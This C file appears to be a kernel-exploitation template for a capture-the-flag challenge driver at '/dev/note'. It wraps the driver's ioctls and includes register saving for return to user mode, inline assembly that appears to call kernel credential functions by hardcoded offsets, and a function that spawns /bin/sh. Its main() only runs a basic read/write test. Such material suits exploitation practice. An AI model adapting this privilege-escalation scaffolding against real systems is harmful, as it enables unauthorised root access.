#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <assert.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <linux/userfaultfd.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/mman.h>
#include <poll.h>
#include <sys/ioctl.h>
#include <pthread.h>
#include <sys/prctl.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/prctl.h>
#include <sys/syscall.h>
#include <stdint.h>
#include <sys/socket.h>
#include <sys/uio.h>


// commands
#define DEV_PATH "/dev/note"   // the path the device is placed

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)


// utils
#define WAIT getc(stdin);
#define ulong unsigned long
#define uint unsigned int
#define NULL (void*)0
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
ulong user_cs,user_ss,user_sp,user_rflags;
struct pt_regs {
	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
	ulong orig_ax; ulong ip; ulong cs; ulong flags;
  ulong sp; ulong ss;
};
void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}
void NIRUGIRI(void)
{
  char *argv[] = {"/bin/sh",NULL};
  char *envp[] = {NULL};
  execve("/bin/sh",argv,envp);
}
static void save_state(void) {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r" (user_cs), "=r" (user_ss), "=r"(user_sp), "=r" (user_rflags) : : "memory" 		);
}

static void shellcode(void){
  asm(
    "xor rdi, rdi\n"
    "mov rbx, QWORD PTR [rsp+0x50]\n"
    "sub rbx, 0x244566\n"
    "mov rcx, rbx\n"
    "call rcx\n"
    "mov rdi, rax\n"
    "sub rbx, 0x470\n"
    "call rbx\n"
    "add rsp, 0x20\n"
    "pop rbx\n"
    "pop r12\n"
    "pop r13\n"
    "pop r14\n"
    "pop r15\n"
    "pop rbp\n"
    "ret\n"
  );
}
// (END utils)

// (shared_house)
#define SH_ALLOC  0xC12ED001
#define SH_FREE   0xC12ED002
#define SH_WRITE  0xC12ED003
#define SH_READ   0xC12ED004

#define FAIL1     0xffffffffffffffa
#define FAIL2     0xfffffffffffffff

struct query{
  ulong size;
  char *buf;
};

#define INF 1<<31
int shfd;
uint current_size = INF;


void _alloc(uint size){
  printf("[+] alloc: %x\n", size);
  assert(size <= 0x80);
  struct query q = {
    .size = size
  };
  int tmp = ioctl(shfd, SH_ALLOC, &q);
  assert(tmp!=FAIL1 && tmp!=FAIL2);
  current_size = size;
}

void _free(void){
  printf("[+] free\n");
  assert(current_size != INF);
  struct query q = {
  };
  int tmp = ioctl(shfd, SH_FREE, &q);
  assert(tmp!=FAIL1 && tmp!=FAIL2);
  current_size = INF;
}

void _write(char *buf, uint size){
  printf("[+] write: %p %x\n", buf, size);
  assert(current_size != INF && size <= current_size);
  assert(current_size != -1);
  struct query q = {
    .buf = buf,
    .size = size
  };
  int tmp = ioctl(shfd, SH_WRITE, &q);
  assert(tmp!=FAIL1 && tmp!=FAIL2);
}

void _read(char *buf, uint size){
  printf("[+] read: %p %x\n", buf, size);
  assert(current_size != INF && size <= current_size);
  struct query q = {
    .buf = buf,
    .size = size
  };
  int tmp = ioctl(shfd, SH_READ, &q);
  assert(tmp!=FAIL1 && tmp!=FAIL2);
}
// (END shared_house)

int main(int argc, char *argv[]) {
  shfd = open(DEV_PATH, O_RDWR);
  assert(shfd >= 0);

  char *wbuf = malloc(0x1000);
  char *rbuf = malloc(0x1000);
  sprintf(wbuf, "Hello, world!\x00");
  _alloc(0x30);
  _write(wbuf, 0x20);
  _read(rbuf, 0x20);
  printf("read: %s\n", rbuf);
  _free();

  return 0;
}
